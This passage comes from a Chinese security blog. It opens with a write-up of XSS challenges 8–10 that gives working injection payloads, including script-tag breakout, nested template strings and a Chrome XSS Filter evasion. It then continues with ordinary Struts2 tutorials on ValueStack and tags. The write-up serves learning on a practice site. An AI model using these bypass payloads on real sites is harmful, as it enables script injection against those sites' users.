看到红框，在最上面的script标签中插入&lt;!--会导致红框括起来的部分优先级比外部的script标签高，此时在&lt;!--后面插入&lt;script标签会闭合掉原本最上面script标签对应的&lt;/script&gt;标签如绿框部分，而最上面的&lt;script&gt;则匹配的--&gt;之后的&lt;/script&gt;，从而突破了原本的script标签。 最终payload如下： 12345?px=\\&apos;-`-alert(1)//&lt;!--&lt;script &gt;?px=\\&apos;-alert(1)`//&lt;!--&lt;script ?px=&lt;!--&lt;script \\&apos;-`-alert(1)//?px=&lt;!--&lt;script \\&apos;-alert(1)`//?px=&lt;!--&lt;script `)/*\\&apos;%0aalert(1)%0aalert(`*/// 0x08 xsstest8题目地址：http://px1624.sinaapp.com/test/xsstest8/ 查看源码： 1234567&lt;script&gt;var px='';var px1624='';&lt;/script&gt;give me xss by pass~8&lt;div style=\"display:none\"&gt;&lt;/div&gt;&lt;input type=\"hidden\" value=\"\"&gt; 推测参数为px。测试发现有4个输出点，其中两个在JS中，另外两个在HTML中，其中第一个HTML输出点限制了长度： 测试下过滤点，JS中是对特殊字符进行了转义，而HTML中的则是两个处理方式都不同、一个是HTML编码和转义、另一个是直接输出在html标签的属性值中： 那就在最后一个HTML输出点中搞起，尝试&quot; onxxx=alert(1)，先闭合双引号，发现直接被过滤替换为字符串”px_xss”了： 这种思路是没戏的，看下能不能像前面一样利用&lt;!--&lt;script&gt;来跳出script标签限制。由于前面两处JS输出点是同步输出且第一处HTML输出点对尖括号进行了HTML实体编码，因此实际能用的只有最后的那个HTML输出点。 我们直接像前面那样输入构造，然并卵，这里JS中输出点的&lt;!--&lt;script&gt;会把页面中唯一的&lt;/script&gt;吃掉，但是由于&lt;!--&lt;script&gt;有多个，因此原本最上面的&lt;script&gt;标签一直未能成功闭合： 既然是因为script标签未闭合导致后面都被当作是标签内的内容导致无法成功弹框，那么就往&lt;!--后面注入个&lt;/script&gt;来闭合，虽然有4个输出点，但前面两个JS输出点由于有转义符所以其中的&lt;/script&gt;并不会被成功识别解析，而第三个输出点是进行了HTML实体编码也不会被成功解析，但是最后的输出点是原封不动地输出到input标签的value属性值中，通过&lt;!--的特性可使其后的&lt;/script&gt;优先级高于input标签而去匹配其前面的&lt;script&gt;标签： OK，跳出原先的script标签并闭合掉了最上面的&lt;script&gt;标签，此时多了注入的&lt;script&gt;标签来了，这就简单了，payload如下： 1?px=&lt;!--&lt;/script&gt;&lt;script &gt;alert(1)&lt;/script&gt; 当然这个payload是不能过Chrome的XSS Filter的，虽然最新版的Chrome把XSS Filter去掉了，但低版本的话就没戏了，不通用。 如何通用呢？参考思路是利用了前面看到的将双引号过滤为px_xss字符串来构造的： 1?px=&lt;!--&lt;/script&gt;&lt;script &gt;&quot;=alert(1)&lt;/script&gt; 为什么这样就可以了？估计很多人肯定一脸懵逼吧。这个要先了解下谷歌xss filter的运行机制，如下图，主要是将输出的代码和URL中的代码进行对比，如果不同就会默认为安全输出。 那么就很好理解了，前面几个人的这个payload，输出和URL是一样的，所以会被xss filter认为是有XSS风险，进行拦截。 ID：香草 的这个，巧妙的利用了此题对双引号过滤为实体字符的策略，这样输出和URL位置就不一样了，所以xss filter就不会进行拦截了。 此题你会发现，上面的答案控制台是会报错的，因为这里等于是重写写入了一个script标签对，然后报错是因为之前的那个script里面语法各种报错了。 0x09 xsstest9题目地址：http://px1624.sinaapp.com/test/xsstest9/ 查看源码： 123456789&lt;script&gt;var px='';var px1624='';&lt;/script&gt;give me xss by pass~9&lt;div style=\"display:none\"&gt;&lt;/div&gt;&lt;div style=\"display:none\"&gt;&lt;/div&gt;&lt;!--px--&gt;&lt;script&gt;'px'&lt;/script&gt; 和第八题类似，还是四处输出点，区别就是这里对双引号的过滤方式进行了改变，而且对2处HTML位置的输出点都做了HTML编码，并且同步限制了长度。所以想着用上面的方法直接写入标签，那基本上是不可能的了。 这题思路构造对本人来说过于复杂，就直接看payload： 1?px=1\\&apos;-&#123;a:`&#125;-alert(1)//`&#125;-&#123;a:`$&#123;`&lt;!--&lt;script &gt; 简单说下涉及的Tricks： 使用JS模板字符串连接闭合掉无用的数据，如果不行则使用内嵌模板字符串的形式来内嵌掉一些字符串再闭合掉其余的（模板字符串及其嵌套模板参考：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings）； 使用&lt;!--&lt;script &gt;来跳出原script标签的限制； 遇到大括号同步闭合的问题时，可以想到function(){}和if(){}以及{a:1}这几种，从3者的构造灵活度上来看，无疑第三种的这个对象是最合适的，所以我们这里用对象进行构造； 0x0A xsstest10题目地址：http://px1624.sinaapp.com/test/xsstest10/ 查看源码： 1234567891011&lt;script&gt;var px='';var px1624='';&lt;/script&gt;give me xss by pass~10&lt;div style=\"display:none\"&gt;&lt;/div&gt;&lt;div style=\"display:none\"&gt;&lt;/div&gt;&lt;!--px--&gt;&lt;script&gt;\"px\"&lt;/script&gt; 这题也没搞出来，直接看参考答案吧。 看着好像和第九题差不多，也是4处输出，js中的过滤规则是一样的，不同的是html中第一处的输出将字符限制的只有2个了，第二处没有限制长度。这样的话，即使知道了上面的构造思路，但是在构造上整体还是比第九题要难一些，因为毕竟2个字符长度能做的事情还是比较有限的。 payload： 1?px=`&#125;\\&apos;-&#123;a:`&#125;-alert(1)//`&#125;-&#123;a:`$&#123;`$&#123;`&lt;!--&lt;script &gt;&apos; 0x0B more看下更多的payload： 1234567xsstest8?px=\\&apos;-&#123;a:`&#125;-alert(1)//&lt;/script&gt;`&#125;-&#123;a:`$&#123;`&lt;!--&lt;script &gt;?px=\\&apos;-&#123;a:`&#125;-alert(1)//&lt;/script&gt;&lt;!--&lt;script &gt;`&#125;-&#123;c:`$&#123;`8、9、10通用?px=`&#125;-alert(1)//&lt;/script&gt;`&#125;-&#123;a:`$&#123;`\\&apos;-&#123;a:`&#125;$&#123;`&lt;!-- &lt;script &gt;?px=`&#125;//&lt;/script&gt;1111111`-alert(1)-&#123;a:`$&#123;`\\&apos;-`&#125;$&#123;`&lt;!--&lt;script &gt; 在这10个BAT的XSS实例的解法思路中，我们用到了javascript中的运算符、模板字符串、嵌套模板、正则表达式、换行符、对象等知识。以及用到了断点调试、控制台分析、本地代码映射等方法。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"Struts2基础篇之ValueStack（值栈）","date":"2020-07-09T14:58:26.000Z","path":"2020/07/09/Struts2基础篇之ValueStack（值栈）/","text":"0x00 参考本笔记直接参考或引自如下链接文章： http://c.biancheng.net/struts2/ https://www.w3cschool.cn/struts_2/ 0x01 简介值栈（ValueStack）就是 OGNL 表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。值栈是一组对象，按照提供的顺序存储以下这些对象： 序号 对象和说明 1 Temporary对象实际中存在各种在页面执行期间创建的temporary对象。例如，JSP标签循环集合的当前迭代值。 2 Model对象如果在struts应用程序中使用Model对象，则当前Model对象放在值堆栈上的action之前。 3 Action对象这是指正在执行的当前action对象。 4 命名对象这些对象包括#application，#session，#request，#attr和#parameters以及所引用的相应的servlet作用域。 在使用 Struts2 的项目中，Struts2 会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。 0x02 作用值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将 Struts2 的标签与 OGNL 表达式结合使用。值栈实际上是一个接口，在 Struts2 中利用 OGNL 时，实际上使用的就是实现了该接口的 OgnlValueStack 类，这个类是 OGNL 的基础。 0x03 生命周期值栈贯穿整个 Action 的生命周期，每个 Action 类的对象实例都拥有一个 ValueStack 对象，在 ValueStack 对象中保存了当前 Action 对象和其他相关对象。 Struts2 框架把 ValueStack 对象保存在一个名为 struts.valueStack 的 request 属性中，也就是说，值栈与 Action 的生命周期一致。值栈的生命周期随着 request 的创建而创建，随着 request 的销毁而销毁。 0x04 值栈的获取方式要获取值栈中存储的数据，首先应该获取值栈。 值栈的获取有两种方式。 在request中获取值栈ValueStack 对象在 request 范围内的存储方式为 request.setAttribute(&quot;struts.valueStack&quot;,valuestack)，可以通过如下方式从 request 中取出值栈的信息。 123//获取 ValueStack 对象，通过 request 对象获取ValueStack valueStack = (ValueStack)ServletActionContext.getRequest() .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY); ServletActionContext.STRUTS_VALUESTACK_KEY 是 ServletActionContext 类中的常量，它的值为 struts.valueStack。 在ActionContext中获取值栈在使用 Struts2 框架时，可以使用 OGNL 操作 Context 对象从 ValueStack 中存取数据，也就是说，可以从 Context 对象中获取 ValueStack 对象。实际上，Struts2 框架中的 Context 对象就是 ActionContext。 ActionContext 获取 ValueStack 对象的方式如下所示： 12//通过 ActionContext 获取 valueStack 对象ValueStack valueStack = ActionContext.getContext().getValueStack(); ActionContext 对象是在 StrutsPrepareAndExcuteFilter 的 doFilter() 方法中被创建的，在源码中用于创建 ActionContext 对象的 createActionContext() 方法内可以找到获取的 ValueStack 对象的信息。 方法中还有这样一段代码： 1ctx=new ActionContext(stack.getContext()); 从上述代码中可以看出，ValueStack 对象中的 Context 对象被作为参数传递给了 ActionContext 对象，这也就说明 ActionContext 对象中持有了 ValueStack 对象的引用，因此可以通过 ActionContext 对象获取 ValueStack 对象。 其实ValueStack就在ActionContext的request-&gt;struts.ValueStack中： 0x05 值栈的方法一旦你有一个值栈对象，你可以使用以下方法来操纵该对象： 序号 值栈方法和说明 1 Object findValue(String expr)通过在默认搜索顺序中对值栈评估所给定的表达式来查找值。 2 CompoundRoot getRoot()获取将对象推入值栈的CompoundRoot。 3 Object peek()获取值栈顶部的对象而不改变值栈。 4 Object pop()获取值栈顶部的对象，并将其从值栈中删除。 5 void push(Object o)将对象放在值栈的顶部。 6 void set(String key,Object o)使用给定的key在值栈上设置一个对象，使其可通过findValue（key,…）检索。 7 void setDefaultType(Class defaultType)设置在获取值时要转换的默认类型。 8 void setValue(String expr,Object value)尝试使用由默认搜索顺序给定的表达式在值栈的bean上设置属性。 9 int size() 获取值栈中的对象数。 0x06 ValueStack、StackContext、ActionContext具体作用的描述: valueStack: 里面存放的是Action类中通过set方法设置的属性值(表单传过来的值等),由OGNL框架实现 stackContext: 也是用来存值的,stack上下文，它包含一些列对象，包括request/session/attr/application map等 actionContext: 是action的上下文,可以得到request,session,application等,我们在JSP页面中访问value stack的内容时，是不用加#，而如果是访问stack context的其他对象则要加上# 具体区别: ActionContext 就是应用上下文，可以通过他来访问session对象等，可以保存的数据，以map形式存储,在这个应用中都可以访问该数据。通常用于还回一个session对象。 ValueStack 是OGNL表达式语言中的值栈， 用来封装继承了action接口的类的属性值，以栈结构存储,在同一个请求范围类有效，在页面中直接通过表达式${属性名}就可以取出 值栈也称为栈结构，ActionContext也称为映射结构,表示值栈的context ValueStack和ActionContext本质上可以互相获得。ValueStack.getContext()方法得到的Map其实就是ActionContext的Map ValueStack的内容经过调试发现： 值得注意的以下几点： context实际上就是ActionContext的context内容； securityMemberAccess是后续的Struts2一直发展的安全措施； ActionContext的内容ActionContext主要维护一个context对象，我们下面称为ContextMap。 一般情况下，root 对象在存储 Action 的相关信息时会把相关的映射压入ContextMap中，这些相关的映射具体如下： key key的声明处 value的类型 value.toString() com.opensymphony.xwork2.dispatcher.HttpServletRequest StrutsStatics.HTTP_REQUEST org.apache.struts2.dispatcher.StrutsRequestWrapper org.apache.struts2.dispatcher.StrutsRequestWrapper@10984e0 application 无 org.apache.struts2.dispatcher.ApplicationMap 略 com.opensymphony.xwork2.ActionContext.locale ActionContext.LOCALE java.util.Locale zh_CN com.opensymphony.xwork2.dispatcher.HttpServletResponse StrutsStatics.HTTP_RESPONSE org.apache.catalina.connector.ResponseFacade org.apache.catalina.connector.ResponseFacade@14ecfe8 xwork.NullHandler.createNullObjects Boolean false com.opensymphony.xwork2.ActionContext.name ActionContext.ACTION_NAME String index com.opensymphony.xwork2.ActionContext.conversionErrors ActionContext.CONVERSION_ERRORS java.util.HashMap {} com.opensymphony.xwork2.ActionContext.application ActionContext.APPLICATION org.apache.struts2.dispatcher.ApplicationMap 略 attr 无 org.apache.struts2.util.AttributeMap org.apache.struts2.util.AttributeMap@133a2a8 com.opensymphony.xwork2.ActionContext.container ActionContext.CONTAINER com.opensymphony.xwork2.inject.ContainerImpl com.opensymphony.xwork2.inject.ContainerImpl@fc02c8 com.opensymphony.xwork2.dispatcher.ServletContext StrutsStatics.SERVLET_CONTEXT org.apache.catalina.core.ApplicationContextFacade org.apache.catalina.core.ApplicationContextFacade@11ad78c com.opensymphony.xwork2.ActionContext.session ActionContext.SESSION org.apache.struts2.dispatcher.SessionMap {} com.opensymphony.xwork2.ActionContext. actionInvocation ActionContext.ACTION_INVOCATION com.opensymphony.xwork2.DefaultActionInvocation com.opensymphony.xwork2.DefaultActionInvocation@13d4497 xwork.MethodAccessor.denyMethodExecution 笔者很懒，没有找 Boolean false report.conversion.errors 笔者很懒，没有找 Boolean false session 无 org.apache.struts2.dispatcher.SessionMap {} com.opensymphony.xwork2.util.ValueStack.ValueStack ValueStack.VALUE_STACK com.opensymphony.xwork2.ognl.OgnlValueStack com.opensymphony.xwork2.ognl.OgnlValueStack@16237fd request 无 org.apache.struts2.dispatcher.RequestMap 略 action 笔者很懒，没有找 com.example.MyAction 略 struts.actionMapping 笔者很懒，没有找 org.apache.struts2.dispatcher.mapper.ActionMapping org.apache.struts2.dispatcher.mapper.ActionMapping@892cc5 parameters 无 java.util.HashMap {} com.opensymphony.xwork2.ActionContext.parameters ActionContext.PARAMETERS java.util.TreeMap 0x06 值栈内部结构详解ValueStack 对象的内部有两个逻辑部分。 ObjectStack（对象栈）：是 CompoundRoot 类型，用 ArrayList 定义，Struts2 把动作和相关对象压入 ObjectStack 中。 ContextMap（Map 栈）：是 OgnlContext 类型，是一个 Map 集合，Struts2 把各种各样的映射关系（一些 Map 类型的对象）压入 ContextMap 中。 Demo新建一个名称为 ValueStackAction 的类，并在类中编写一个获取 ValueStack 对象的方法： 1234567891011121314package com.mi1k7ea.ognl;import com.opensymphony.xwork2.ActionContext;import com.opensymphony.xwork2.ActionSupport;import com.opensymphony.xwork2.util.ValueStack;public class ValueStackAction extends ActionSupport &#123; public String execute() throws Exception &#123; // 通过ActionContext获取valueStack对象 ValueStack valueStack = ActionContext.getContext().getValueStack(); System.out.println(valueStack); return SUCCESS; &#125;&#125; 将新建的 Action 信息添加到 struts.xml 中： 123&lt;action name=\"valueStack\" class=\"com.mi1k7ea.ognl.ValueStackAction\"&gt; &lt;result name=\"success\"&gt;index.jsp&lt;/result&gt;&lt;/action&gt; 最后，开启远程调试，在 ValueStackAction 类中的第 11 行处设置断点，访问http://localhost:8080/st2test/valueStack.action，从 Variables 窗口中可以看到 valueStack 的结构信息： 这里只需关注 context 对象和 root 对象。从图中可以看到，context 对象的类型为 OgnlContext，root 对象的类型为 CompoundRoot。如果要查看这两个类的源码，则可以看到如下语句： 12OgnlContext extends Object implements MapCompoundRoot extends ArrayList 从上述两个类的源码中可以看出，context 对象实际上就是一个 Map，root 对象实际上就是一个 ArrayList。也就说明了 ValueStack 的两个逻辑部分 ObjectStack 对应 ArrayList（root），ContextMap 对应 Map（context）。 一般情况下，root 对象在存储 Action 的相关信息时会把相关的映射压入 ContextMap 中，这些相关的映射具体如下。 parameters：该 Map 中包含当前请求的请求参数。 request：该 Map 中包含当前 request 对象中的所有属性。 session：该 Map 中包含当前 session 对象中的所有属性。 application：该 Map 中包含当前 application 对象中的所有属性。 attr：该 Map 按如下顺序检索某个属性：request，session，application。 0x07 获取值栈数据的方式在 Struts2 中，值栈的主要作用就是解决从 Action 到页面的数据交换问题。在采用属性驱动和模型驱动交换数据时，Struts2 会将对象自动存储到 ValueStack 中，其存储说明如下： 属性驱动：每次请求访问 Action 的对象时，Action 中的属性对象会被自动压入 ValueStack 中。 模型驱动：Action 如果实现了 ModelDriven 接口，那么 ModelDrivenInterceptor 拦截器会生效，会将 model 对象压入到 ValueStack 中。 属性对象或 model 对象存储到 ValueStack 中后，就可以直接从 ValueStack 中获取页面所需的数据。 Demo参考：http://c.biancheng.net/view/4145.html 0x08 通过EL访问值栈的数据具体参考：http://c.biancheng.net/view/4146.html","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://www.mi1k7ea.com/tags/Struts2/"}]},{"title":"Struts2基础篇之标签","date":"2020-07-05T13:41:17.000Z","path":"2020/07/05/Struts2基础篇之标签/","text":"0x00 参考本笔记直接参考或引自如下链接文章： http://c.biancheng.net/struts2/ https://www.w3cschool.cn/struts_2/ 0x01 标签的分类和使用Struts2 是一个优秀的 MVC 框架，其实现重点主要放在了业务逻辑控制器部分和视图页面部分。控制器部分主要由 Action 提供支持，而视图页面部分则由大量的标签提供支持。 Struts2 的标签库是一个比较完善且功能强大的标签库，它将所有标签都统一到一个标签库中，从而简化了标签的使用；它提供了对主题和模板的支持，极大地简化了视图页面代码的编写；它还提供了对 Ajax 的支持，极大地丰富了视图页面的展示效果。 与 JSTL（JSP Standard Tag Library，JSP标准标签库）相比，Struts2 标签库更加易用和强大。 标签库的分类Struts2 框架对整个标签库进行了分类，按其功能大致可分为两类，如图所示。 可以看出，Struts2 的标签库主要分为两大类：普通标签和 UI 标签。普通标签的主要功能是在页面生成时控制页面代码的执行流程；UI 标签的主要功能是以丰富且可复用的 HTML 文件显示数据。 普通标签又分为控制标签（Control Tags）和数据标签（Data Tags）。控制标签用于完成条件逻辑和循环逻辑的控制，也可用于做集合的操作。数据标签用于输出后台的数据和完成其他数据访问功能。 UI 标签又分为表单标签（Form Tags）、非表单标签（Non-Form Tags）和 Ajax 标签。表单标签主要用于生成 HTML 页面中的表单元素，非表单标签主要用于生成非表单的可视化元素，如输出 Action 中封装的信息等。Ajax 标签主要用于提供对 Ajax 技术的支持。 标签的使用使用 Struts2 的标签库非常简单，一般只需在 JSP 文件内使用 taglib 指令导入 Struts2 标签库即可，其导入代码如下所示： 1&lt;%@taglib prefix=\"s\" uri=\"/struts-tags\" %&gt; 在上述代码中，taglib 指令的 uri 属性用于指定引入标签库描述符文件的位置，prefix 属性用于指定引入标签库描述符文件的前缀。在 JSP 文件中，所有的 Struts2 标签都建议使用 s 作为前缀。 0x02 控制标签针对页面中经常需要实现的流程控制和循环等操作，Struts2标签库中提供了控制标签。 if和else标签Struts2 标签库中的 &lt;s:if&gt;、&lt;s:elseif&gt;、&lt;s:else&gt; 标签与 Java 中的 if、else if 和 else 语句功能类似，主要用于程序的分支逻辑控制。其中，只有 &lt;s:if&gt; 标签可以单独使用，而 &lt;s:elseif&gt;、&lt;s:else&gt; 都必须与 &lt;s:if&gt; 标签结合才能使用。其使用语法格式如下所示： 123456789&lt;s:if test=\"表达式1\"&gt; 标签体&lt;/s:if&gt;&lt;s:elseif test=\"表达式2\"&gt; 标签体&lt;/s:elseif&gt;&lt;s:else&gt; 标签体&lt;/s:else&gt; 在上述语法格式中，&lt;s:if&gt; 和 &lt;s:elseif&gt; 标签必须指定 test 属性，该属性用于设置标签的判断条件，其值是一个 boolean 类型的条件表达式。 Demo参考：https://www.w3cschool.cn/struts_2/struts_if_else_tags.html iterator标签&lt;s:iterator&gt; 标签主要用于对集合中的数据进行迭代，它可以根据条件遍历集合中的数据。&lt;s:iterator&gt; 标签的属性及相关说明如表所示。 属性 是否必须 默认值 类型 描 述 begin 否 0 Integer 迭代数组或集合的起始位置 end 否 数组或集合的长度大小减 1，若 Step 为负，则为 0。 Integer 迭代数组或集合的结束位置 status 否 false Boolean 迭代过程中的状态 step 否 1 Integer 指定每一次迭代后索引增加的值 value 否 无 String 迭代的数组或集合对象 var 否 无 String 将生成的 Iterator 设置为 page 范围的属性 id 否 无 String 指定了集合元素的 id，现已用 var 代替 如果在 &lt;s:iterator&gt; 标签中指定 status 属性，就可以通过该属性获取迭代过程中的状态信息，如元素数、当前索引值等。通过 status 属性获取信息的方法如下表所示（假设其属性值为 st）。 方 法 说 明 st.count 返回当前已经遍历的集合元素的个数 st.first 返回当前遍历元素是否为集合的第一个元素 st.last 返回当前遍历元素是否为集合的最后一个元素 st.index 返回遍历元素的当前索引值 这些iterator将迭代一个值。可迭代值可以是以下任一值：java.util.Collection，java.util.Iterator。在迭代一个iterator时，可以使用Sort标签对结果进行排序，或者使用SubSet标签来获取列表或数组的子集。 以下示例是检索值栈上当前对象的getDays()方法的值，并使用它迭代。&lt;s:property/&gt;标签印出迭代器的当前值。 123&lt;s:iterator value=\"days\"&gt; &lt;p&gt;day is: &lt;s:property/&gt;&lt;/p&gt;&lt;/s:iterator&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_iterator_tags.html merge标签这些merge标签采用两个或多个列表作为参数，并将它们合并在一起，如下所示： 12345678&lt;s:merge var=\"myMergedIterator\"&gt; &lt;s:param value=\"%&#123;myList1&#125;\" /&gt; &lt;s:param value=\"%&#123;myList2&#125;\" /&gt; &lt;s:param value=\"%&#123;myList3&#125;\" /&gt;&lt;/s:merge&gt;&lt;s:iterator value=\"%&#123;#myMergedIterator&#125;\"&gt; &lt;s:property /&gt;&lt;/s:iterator&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_merge_tag.html append标签这些append标签采用两个或多个列表作为参数，并将它们全部附加在一起，如下所示： 12345678&lt;s:append var=\"myAppendIterator\"&gt; &lt;s:param value=\"%&#123;myList1&#125;\" /&gt; &lt;s:param value=\"%&#123;myList2&#125;\" /&gt; &lt;s:param value=\"%&#123;myList3&#125;\" /&gt;&lt;/s:append&gt;&lt;s:iterator value=\"%&#123;#myAppendIterator&#125;\"&gt; &lt;s:property /&gt;&lt;/s:iterator&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_append_tag.html generator标签这些generator标签基于提供的val属性生成迭代器。下面的generator标签生成一个迭代器并使用iterator标签打印出来。 12345&lt;s:generator val=\"%&#123;'aaa,bbb,ccc,ddd,eee'&#125;\"&gt; &lt;s:iterator&gt; &lt;s:property /&gt;&lt;br/&gt; &lt;/s:iterator&gt;&lt;/s:generator&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_generator_tag.html 0x03 数据标签数据标签主要用于提供各种和数据访问相关的功能，如输出信息和显示调试信息等。 property标签&lt;s:property&gt; 标签的作用是输出指定的值，通常输出的是 value 属性指定的值，&lt;s:property&gt; 标签的属性及属性说明如下。 value：可选属性，指定需要输出的属性值，如果没有指定该属性，则默认输出 ValueStack 栈顶的值（关于值栈内容会在后面教程中进行讲解）。 id：可选属性，指定该元素的标识。 default：可选属性，如果要输出的属性值为 null，则显示 default属性的指定值。 escape：可选属性，指定是否忽略 HTML 代码。默认值是 true，即忽略输出值中的 HTML 代码。 示例： 1234567&lt;s:push value=\"myBean\"&gt; &lt;!-- Example 1: --&gt; &lt;s:property value=\"myBeanProperty\" /&gt; &lt;!-- Example 2: --&gt;TextUtils &lt;s:property value=\"myBeanProperty\" default=\"a default value\" /&gt;&lt;/s:push&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_property_tag.html DemopropertyTags.jsp，分别对 &lt;s:property&gt; 标签的 value、default 和 escape 属性的使用进行了演示： 1234567891011121314151617181920&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;%@taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; &lt;title&gt;property标签&lt;/title&gt;&lt;/head&gt;&lt;body&gt;输出字符串：&lt;s:property value=\"'this is a string'\"/&gt;&lt;br/&gt;输出默认值：&lt;s:property value=\"\" default=\"default_value\"/&gt;&lt;br/&gt;忽略HTML代码：&lt;s:property value=\"'&lt;h2&gt;www.mi1k7ea.com&lt;/h2&gt;'\" escape=\"true\"/&gt;&lt;br/&gt;不忽略HTML代码：&lt;s:property value=\"'&lt;h2&gt;www.mi1k7ea.com&lt;/h2&gt;'\" escape=\"false\"/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt; 效果： action标签此标签允许开发人员通过指定action名称和可选的命名空间直接从JSP页面调用action。标签的正文内容用于呈现action的结果。在struts.xml中为此action定义的任何结果处理程序将会被忽略，除非指定executeResult参数。 1234567&lt;div&gt;Tag to execute the action&lt;/div&gt;&lt;br /&gt;&lt;s:action name=\"actionTagAction\" executeResult=\"true\" /&gt;&lt;br /&gt;&lt;div&gt;To invokes special method in action class&lt;/div&gt;&lt;br /&gt;&lt;s:action name=\"actionTagAction!specialMethod\" executeResult=\"true\" /&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_action_tag.html include标签include标签标签用于在当前页面中包含另一个 Web 资源（如 HTML、JSP、Servlet 等）。该标签有两个属性 id 和 value。其中 id 是可选属性，表示该标签的引用；value 是必填属性，用于指定被包含的 Web 资源文件。 在 &lt;s:include&gt; 标签中还可以指定多个 &lt;s:param/&gt; 子标签给被包含的 Web 资源传递请求参数。 Demofile.jsp： 1234567891011121314&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;%@taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;&lt;title&gt;property标签&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;这是被包含页面includefile.jsp&lt;/h2&gt;&lt;br/&gt; 传递的参数为：&lt;%out.print(request.getParameter(\"username\")); %&gt;&lt;/body&gt;&lt;/html&gt; includeTags.jsp： 12345678910111213141516&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;%@taglib prefix=\"s\" uri=\"/struts-tags\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;includeTags&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;这是包含页面includeTags.jsp&lt;/h3&gt;&lt;br/&gt;&lt;s:include value=\"file.jsp\"&gt; &lt;s:param name=\"username\" value=\"'mi1k7ea'\"/&gt;&lt;/s:include&gt;&lt;/body&gt;&lt;/html&gt; 效果： bean标签这些bean标签实例化一个符合JavaBeans规范的类。这个标签有一个主体，可以包含一些Param元素来设置任何mutator方法。如果在BeanTag上设置了var属性，它将把实例化的bean放入值栈的Context中。 1234&lt;s:bean name=\"org.apache.struts2.util.Counter\" var=\"counter\"&gt; &lt;s:param name=\"first\" value=\"20\"/&gt; &lt;s:param name=\"last\" value=\"25\" /&gt;&lt;/s:bean&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_bean_tag.html date标签date标签允许以快速简单的方式格式化日期。用户可以指定自定义日期格式（例如“dd/MM/yyyy hh:mm”），可以生成易读的符号（例如“在2小时14分钟内”），或者可以使用属性文件中的key:“struts.date.format”来回退到预定义的格式。 1234&lt;s:date name=\"person.birthday\" format=\"dd/MM/yyyy\" /&gt;&lt;s:date name=\"person.birthday\" format=\"%&#123;getText('some.i18n.key')&#125;\" /&gt;&lt;s:date name=\"person.birthday\" nice=\"true\" /&gt;&lt;s:date name=\"person.birthday\" /&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_date_tag.html param标签&lt;s:param&gt; 标签主要用于为其他标签提供参数，通常要与其他标签一起使用。在上一部分使用 &lt;s:include&gt; 标签时，就使用了 &lt;s:param&gt; 标签给被包含的页面传递参数。&lt;s:param&gt; 标签有两种用法，具体如下。 一种用法是通过标签体指定参数值，用法如下所示： 1&lt;s:param name=\"color\"&gt;red&lt;/s:param&gt; 另一种用法是使用 value 属性指定参数值，用法如下所示： 1&lt;s:param name=\"color\" value=\"'red'\"/&gt; 上述两种用法的功能一样，不同点在于使用 value 属性设置参数值时，需要添加单引号，而使用标签体设置参数值时，不需要添加单引号。 注意：在使用 value 属性指定参数时，如果不添加单引号，则表示该值为一个引用对象，如果该对象不存在，则为其属性赋值为 null。 Demo参考：https://www.w3cschool.cn/struts_2/struts_param_tag.html push标签这些push标签用于推送堆栈中的值，以简化使用。 1234&lt;s:push value=\"user\"&gt; &lt;s:propery value=\"firstName\" /&gt; &lt;s:propery value=\"lastName\" /&gt;&lt;/s:push&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_property_tag.html set标签这些set标签为指定范围内的变量赋值。当你希望将变量分配给复杂表达式，然后仅仅引用该变量而不是复杂表达式时，它是很有用的。可应用的范围是应用程序，会话，请求，页面和action。 12&lt;s:set name=\"myenv\" value=\"environment.name\"/&gt;&lt;s:property value=\"myenv\"/&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_property_tag.html text标签这些text标签用于呈现I18n文本消息。 123456789101112&lt;!-- First Example --&gt;&lt;s:i18n name=\"struts.action.test.i18n.Shop\"&gt; &lt;s:text name=\"main.title\"/&gt;&lt;/s:i18n&gt;&lt;!-- Second Example --&gt;&lt;s:text name=\"main.title\" /&gt;&lt;!-- Third Examlpe --&gt;&lt;s:text name=\"i18n.label.greetings\"&gt; &lt;s:param &gt;Mr Smith&lt;/s:param&gt;&lt;/s:text&gt; 